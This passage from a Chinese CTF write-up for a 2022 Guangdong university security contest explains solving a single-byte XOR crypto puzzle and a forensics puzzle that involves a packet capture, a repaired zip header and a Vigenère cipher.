src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image021.png" alt="img"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor2"><a href="#xor2" class="headerlink" title="xor2"></a>xor2</h2><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image023.png" alt="img"></p><p>阅读源码发现，就是一个未知的key，逐个异或flag，猜测flag字符串开头第一个应该为f，测试一下第第一个密文和f的ascii码进行异或，结果为120，这就是key，然后将密文逐个异或120，得到flag</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image025.png" alt="img"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="复合"><a href="#复合" class="headerlink" title="复合"></a>复合</h2><p>将数据包所以的http对象导出</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image026.png" alt="img"></p><p>分析发现&#96;flaggggggg.exe为D0CF11E0头部，为doc文件</p><p>打开发现key</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image028.png" alt="img"></p><p>发现pass.md,为zip文件，缺少504B文件头字节</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image029.png" alt="img"></p><p>修改为zip文件解压，获取文件内容如下：</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image030.png" alt="img"></p><p>&#x3D;E2&#x3D;80&#x3D;82在unicode里面这个为空格，因此替换为空</p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image032.png" alt="img"></p><p>尝试发现维吉尼亚解密，key为<code>everything</code></p><p><img src="/2022/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image033.png" alt="img"></p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 第二届广东省大学生网络安全攻防大赛初赛 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
